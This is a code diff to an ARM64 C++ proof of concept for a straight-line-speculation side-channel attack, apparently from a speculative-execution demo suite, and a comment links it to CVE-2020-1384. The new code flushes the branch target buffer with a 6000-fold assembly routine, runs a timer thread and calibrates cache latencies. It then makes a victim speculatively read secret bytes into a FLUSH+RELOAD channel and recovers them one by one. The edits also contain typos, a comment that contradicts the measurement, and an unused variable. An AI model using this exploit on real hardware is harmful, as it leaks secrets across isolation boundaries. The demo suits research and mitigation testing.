@@ -15,39 +15,17 @@
 //
 // This is related to CVE-2020-1384. The attack works as follows:
 //
-//   1. We place a "speculative gadget" (load secret + cache oracle access)
-//      immediately after a BR instruction in memory.
+//   1. FLush target of indirect branch from cache (slow window = SLS window) 
 //
-//   2. The BR target address is loaded from a cache-missed memory location,
-//      so the CPU cannot resolve the branch target immediately.
+//   2. ibtb_flush: evict BTB entries to ensure BTB miss on the BR
 //
-//   3. While waiting for the target address, the CPU fetches and speculatively
-//      executes the instructions that follow the BR in program order -- the
-//      straight-line path -- even though architecturally the BR will redirect
-//      execution to a completely different location.
+//   3. CPU speculatively executes straight-line code after BR:
+//      LDRB secret -> ADD channel offset -> LDR channel (cache side channel)
 //
-//   4. The speculatively executed gadget loads a secret byte and uses it to
-//      index into a cache side-channel oracle (FLUSH+RELOAD).
-//
-//   5. When the BR target finally resolves, the speculative results are
-//      discarded -- but the cache state persists as a side effect.
-//
-//   6. We measure cache access latencies to determine which oracle entry was
-//      touched speculatively, recovering the secret byte.
-//
-// BTB DEFEAT STRATEGY:
-// The Branch Target Buffer (BTB) learns the target of each BR instruction
-// after the first execution. If we used a single BR, the BTB would predict
-// the correct target (SafeTarget) on subsequent calls, preventing straight-
-// line speculation. To defeat this, we use N=32 variants of the BR+payload
-// sequence, each at a unique PC. Each run selects a different variant via
-// (run % N), ensuring the BTB has never seen that BR's PC before. This
-// forces a BTB miss on every call, triggering straight-line speculation.
+//   4. Measure which channel line is not hot using MeasuureReadLatency
 //
 // PLATFORM NOTES:
-// This demo targets ARM64 (AArch64) only. It requires an out-of-order CPU
-// that performs straight-line speculation after indirect branches. Results
-// may vary across microarchitectures.
+// This demo targets ARM64 (AArch64) only. 
 
 #include "compiler_specifics.h"
 
@@ -58,177 +36,170 @@
 #include <array>
 #include <cstring>
 #include <iostream>
+#if SAFESIDE_LINUX
+#include <sched.h>
+#endif
+#include <pthread.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
 
+#include "asm/measurereadlatency.h"
 #include "cache_sidechannel.h"
 #include "instr.h"
 #include "local_content.h"
 #include "utils.h"
 
-// Number of BR+payload variants. Each variant has its BR at a unique PC,
-// so the BTB cannot learn the target across variants. 32 was chosen
-// empirically -- enough to defeat most BTB implementations while keeping
-// the code compact.
-constexpr int kVariantCount = 32;
+#define CHANNEL_SEGMENT 4096
 
-// SafeTarget: the architectural destination of the indirect branch.
-// This function is intentionally empty. When BR jumps here, the RET
-// instruction uses x30 (link register), which still holds the return
-// address to SlsGadget's caller. This means control returns correctly
-// without any stack corruption, as long as SlsGadget is a leaf function
-// (no stack frame of its own).
-SAFESIDE_NEVER_INLINE
-static void SafeTarget() {
-  // Intentionally empty -- returns via x30 set by the original caller.
+__attribute__((aligned(64))) volatile uint64_t counter = 0;
+long miss_min = 0;
+uint8_t channel[256 * CHANNEL_SEGMENT];
+uint64_t *g_target;
+
+void *inc_counter(void *a) {
+#if SAFESIDE_LINUX
+    cpu_set_t set;
+
+    CPU_ZERO(&set);
+    CPU_SET(1, &set);
+    sched_setaffinity(0, sizeof(set), &set);
+#endif
+
+    uint64_t cnt = 0;
+    while (1) {
+        cnt += 1;
+        counter = cnt;
+        asm volatile("DMB OSHST");
+    }
 }
 
-// Global function pointer: the branch target stored in memory.
-// We flush this from cache before each BR so that loading the target
-// address is slow (~100+ cycles), creating a window during which the
-// CPU speculatively executes the straight-line gadget.
-static void (*g_branch_target)(void) = SafeTarget;
-
-// SlsGadget: the core of the SLS attack with multi-PC variants.
-//
-// Memory layout (each variant is exactly 32 bytes = 8 instructions):
-//
-//   variant[0]:
-//     LDR  x0, [g_branch_target]   ; load target (cache miss = slow)
-//     BR   x0                      ; indirect branch to SafeTarget
-//     LDRB w3, [secret_addr]       ; \
-//     ADD  x3, oracle, x3, LSL 12  ;  >-- speculative payload
-//     LDRB w3, [x3]                ; /
-//     B    exit_label              ; skip remaining variants
-//     NOP                          ; padding
-//     NOP                          ; padding
-//
-//   variant[1]:
-//     (same structure, different PC for BR)
-//   ...
-//   variant[31]:
-//     (same structure, different PC for BR)
-//
-//   exit_label:
-//     RET                          ; return to caller
-//
-// Architecturally, BR redirects to SafeTarget which returns to the caller.
-// Speculatively, the CPU executes the three payload instructions straight-line
-// before the BR target is known, loading a secret byte into the cache oracle.
-//
-// This function must remain a leaf function (no calls, no stack frame) so that
-// SafeTarget's RET can return directly to our caller with a clean stack.
-SAFESIDE_NEVER_INLINE
-static void SlsGadget(const char *secret_addr, const void *oracle_base,
-                      size_t variant) {
-  asm volatile(
-      // Compute the address of the selected variant.
-      // Each variant is 32 bytes (8 instructions).
-      // variant_base = address of label "1f" (start of variant array)
-      // target = variant_base + variant * 32
-      "adr x4, 1f\n"
-      "add x4, x4, %3, lsl 5\n"  // variant * 32
-      "br  x4\n"                  // jump to selected variant
-
-      // === Variant array ===
-      // 32 copies of the BR+payload sequence, each exactly 32 bytes.
-      // The .rept directive generates them at assembly time.
-      "1:\n"
-      ".rept 32\n"
-      // Load the branch target from memory. Because g_branch_target was
-      // flushed from cache, this LDR stalls for ~100+ cycles.
-      "  ldr x0, %2\n"
-
-      // Indirect branch. The CPU cannot resolve the target until the LDR
-      // above completes, so it speculatively fetches and executes the
-      // instructions that follow the BR in memory (straight-line).
-      "  br  x0\n"
-
-      // === Straight-line speculation payload ===
-      // These instructions are speculatively executed before BR resolves.
-
-      // Load the secret byte from private_data into w3 (zero-extended to x3).
-      "  ldrb w3, [%0]\n"
-
-      // Compute the oracle address: oracle_base + secret_byte * 4096.
-      // Each oracle entry (BigByte) is 4096 bytes to avoid cache prefetching.
-      "  add  x3, %1, x3, lsl 12\n"
-
-      // Touch the oracle entry -- this loads it into cache, creating a
-      // microarchitectural side effect that survives speculation rollback.
-      "  ldrb w3, [x3]\n"
-
-      // Architecturally: skip remaining variants and jump to exit.
-      // This B instruction is never reached speculatively (BR redirects),
-      // but is needed for correct architectural execution.
-      "  b 2f\n"
-
-      // Padding to make each variant exactly 32 bytes (8 instructions).
-      "  nop\n"
-      "  nop\n"
-      ".endr\n"
-
-      // === Exit point ===
-      // After SafeTarget's RET, control returns here (via x30 from caller).
-      // This label is the target of the B instruction in each variant.
-      "2:\n"
-      :
-      : "r"(secret_addr), "r"(oracle_base), "m"(g_branch_target),
-        "r"(variant)
-      : "x0", "x3", "x4", "memory");
+__attribute__((aligned(32))) int ibtb_flush() {
+    asm volatile(
+        " .rept 6000\n"
+        "   adr x0, 3f\n  br x0\n"
+        "   nop\n"
+        " 1: adr x0, 4f\n  br x0\n"
+        "   nop\n"
+        " 2: nop\n"
+        "    adr x0, 1b\n  br x0\n"
+        "    nop\n"
+        " 3: nop\n"
+        "    adr x0, 2b\n  br x0\n"
+        "    nop\n"
+        " 4: nop\n"
+        " .endr\n"
+        :
+        :
+        : "x0");
+    return 0;
 }
 
-// Leaks private_data[offset] via straight-line speculation after BR.
-//
-// For each run:
-//   1. Flush the cache oracle (all 256 entries)
-//   2. Flush g_branch_target from cache to delay BR resolution
-//   3. Execute SlsGadget with a unique variant index (run % 32)
-//      - The variant's BR is at a PC the BTB has never seen
-//      - BTB miss -> straight-line speculation of the payload
-//   4. Measure oracle latencies to identify which entry was touched
-//   5. Accumulate scores across runs until one byte dominates
+uint64_t calibrate_miss_min(void) {
+    uint64_t sum = 0;
+    uint64_t min_val = 0xFFFFF;
+    const int rounds = 250;
+
+    for (int r = 0; r < rounds; r++) {
+        FlushDataCacheLineNoBarrier(&channel[r * CHANNEL_SEGMENT]);
+        MemoryAndSpeculationBarrier();
+        uint64_t latency = MeasureReadLatency(&channel[r * CHANNEL_SEGMENT]);
+        if (latency < min_val && r > 50)
+            min_val = latency;
+        sum += latency;
+    } 
+    printf("[CALIBRATE] Cache miss (MeasureReadLatency): Avg=%llu, min=%llu",
+           (unsigned long long)(sum / rounds), (unsigned long long)min_val);
+
+    uint64_t hit_sum = 0;
+    for (int r = 0; r < rounds; r++) {
+        ForceRead(&channel[(r % 3) * CHANNEL_SEGMENT]);
+        uint64_t latency = MeasureReadLatency(&channel[(r % 3) * CHANNEL_SEGMENT]);
+        hit_sum += latency;
+    } 
+    printf("[CALIBRATE] Cache hit (MeasureReadLatency): Avg=%llu",
+           (unsigned long long)(hit_sum / rounds));
+   
+    if (min_val > 4)
+        min_val -= 2;
+  
+    printf("[CALIBRATE] miss_min threshold=%llu", (unsigned long long)min_val);
+    return min_val;
+}
+ 
+static void dummy_target() {}
+
+int victim(const char *secret_addr, uint64_t godummy,
+           void *channel_base) {
+    asm volatile(
+        " br %[go]\n"
+        " ldrb w3, [%[sec]]\n"
+        " add x3, %[ch], x3, lsl 12\n"
+        " ldr x4, [x3]\n"
+        :
+        : [sec] "r"(secret_addr), [go] "r"(godummy), [ch] "r"(channel_base)
+        : "x3", "x4", "memory");
+    return 0;
+}
+
 static char LeakByte(size_t offset) {
-  CacheSideChannel sidechannel;
+    CacheSideChannel sidechannel;
+    const uint64_t miss_min_local = miss_min;
 
-  for (int run = 0;; ++run) {
-    sidechannel.FlushOracle();
+    for (int run = 0; run < 200000; ++run) {
+        sidechannel.FlushOracle();
 
-    // Flush the branch target pointer from cache. This makes the LDR in
-    // SlsGadget slow, giving the CPU time to speculatively execute the
-    // straight-line payload before the BR target address is known.
-    FlushDataCacheLine(&g_branch_target);
-    MemoryAndSpeculationBarrier();
+        *g_target = (uint64_t)&dummy_target;
+        FlushDataCacheLine(g_target);
+        MemoryAndSpeculationBarrier();
 
-    // Execute the SLS gadget with a variant index that cycles through
-    // all 32 variants. Each variant has its BR at a unique PC, so the
-    // BTB cannot predict the target -- it always misses and speculates
-    // straight-line.
-    size_t variant = run % kVariantCount;
-    SlsGadget(&private_data[offset], sidechannel.GetOracle().data(), variant);
+        ibtb_flush();
+        FlushDataCacheLine(g_target);
+        MemoryAndSpeculationBarrier();
 
-    // The secret was only accessed speculatively -- there is no architectural
-    // cache hit to use as a reference. AddHitAndRecomputeScores injects an
-    // artificial architectural hit and checks which oracle entry was accessed.
-    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
-    if (result.first) {
-      return result.second;
+        victim(&private_data[offset], *g_target, 
+               (void *)sidechannel.GetOracle().data());
+
+        ibtb_flush();
+
+        std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
+        if (result.first) 
+            return result.second;
     }
 
-    if (run > 100000) {
-      std::cerr << "Does not converge " << result.second << std::endl;
-      exit(EXIT_FAILURE);
-    }
-  }
+    std::cerr << "Does not coverage" << std::endl;
+    return '?';
 }
 
 int main() {
-  std::cout << "Leaking the string: ";
-  std::cout.flush();
-  for (size_t i = 0; i < strlen(private_data); ++i) {
-    // Leak each byte of private_data. The only architectural memory accesses
-    // are to valid bytes in public_data and local auxiliary structures --
-    // private_data is never accessed in the C++ execution model.
-    std::cout << LeakByte(i);
+#if SAFESIDE_LINUX
+    PinToTheFirstCore();
+#endif
+
+    pthread_t inc_counter_thread;
+    if (pthread_create(&inc_counter_thread, NULL, inc_counter, NULL)) {
+        fprintf(stderr, "Error create thread\n");
+        return -1;
+    }
+
+    while (counter < 500000000) {
+        ibtb_flush();
+    }
+
+    printf("[INFO] main@%p, victim@%p, private_date@%p\n",
+           (void *)&main, (void *)&victim, (void *)private_data);
+    printf("[INFO] private_date = %s\n", private_data);
+
+    g_target = (uint64_t *)malloc(sizeof(uint64_t));
+
+    miss_min = calibrate_miss_min();
+    std::cout << "Leaking the string: ";
     std::cout.flush();
-  }
-  std::cout << "\nDone!\n";
+    for (size_t i = 0; i < strlen(private_data); ++i) {
+        std::cout << LeakByte(i);
+        std::cout.flush();
+    }
+    std::cout << "\nDone!\n";
 }
